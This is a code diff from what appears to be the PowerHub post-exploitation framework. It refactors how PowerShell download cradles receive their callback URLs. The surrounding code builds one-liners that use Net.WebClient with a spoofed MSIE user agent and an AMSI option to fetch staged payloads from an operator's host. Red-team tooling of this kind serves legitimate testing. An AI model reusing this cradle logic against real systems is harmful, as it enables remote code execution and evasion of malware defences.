@@ -17,31 +17,6 @@ symbol_list = {None: None}
 VARLIST = []
 
 
-def callback_urls():
-    from powerhub.env import powerhub_app as ph_app
-    return {
-        'http': 'http://%s:%d/%s' % (
-            ph_app.args.URI_HOST,
-            ph_app.args.URI_PORT if ph_app.args.URI_PORT else ph_app.args.LPORT,
-            ph_app.args.URI_PATH+'/' if ph_app.args.URI_PATH else '',
-        ),
-        'https': 'https://%s:%d/%s' % (
-            ph_app.args.URI_HOST,
-            ph_app.args.URI_PORT if ph_app.args.URI_PORT else ph_app.args.SSL_PORT,
-            ph_app.args.URI_PATH+'/' if ph_app.args.URI_PATH else '',
-        ),
-    }
-
-
-# TODO consider https
-def webdav_url():
-    from powerhub.env import powerhub_app as ph_app
-    return 'http://%s:%d/webdav' % (
-        ph_app.args.URI_HOST,
-        ph_app.args.LPORT,
-    )
-
-
 @Memoize
 def get_stager_increments():
     """Return number of sections in stage 1"""
@@ -82,7 +57,7 @@ def build_cradle_https(params):
     return result
 
 
-def build_cradle_webclient(params, key, incremental=False):
+def build_cradle_webclient(params, key, callback_urls, incremental=False):
     web_client = symbol_name('web_client', natural=params['natural'], refresh=True)
 
     result = "$%(web_client)s=New-Object Net.WebClient;"
@@ -98,7 +73,7 @@ def build_cradle_webclient(params, key, incremental=False):
             "'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)';"
         )
 
-    url = callback_urls()[params['transport']]
+    url = callback_urls[params['transport']]
 
     query = '?'
     for p in params.parameters:
@@ -146,7 +121,7 @@ def build_cradle_webclient(params, key, incremental=False):
     return result
 
 
-def build_cradle(params, key):
+def build_cradle(params, key, callback_urls):
     """Build the download cradle given a dict of GET arguments"""
     log.debug("Building cradle with these parameters: %s" % params)
 
@@ -160,10 +135,12 @@ def build_cradle(params, key):
         result += "$%(key_var)s='%(key)s';"
 
     if params['transport'].startswith('http'):
-        result += build_cradle_webclient(params, key, incremental=params['incremental'])
+        result += build_cradle_webclient(
+            params, key, callback_urls, incremental=params['incremental']
+        )
 
     result = result % dict(
-        url=callback_urls()[params['transport']],
+        url=callback_urls[params['transport']],
         transport=params['transport'],
         amsi=params['amsi'],
         key_var=key_var,
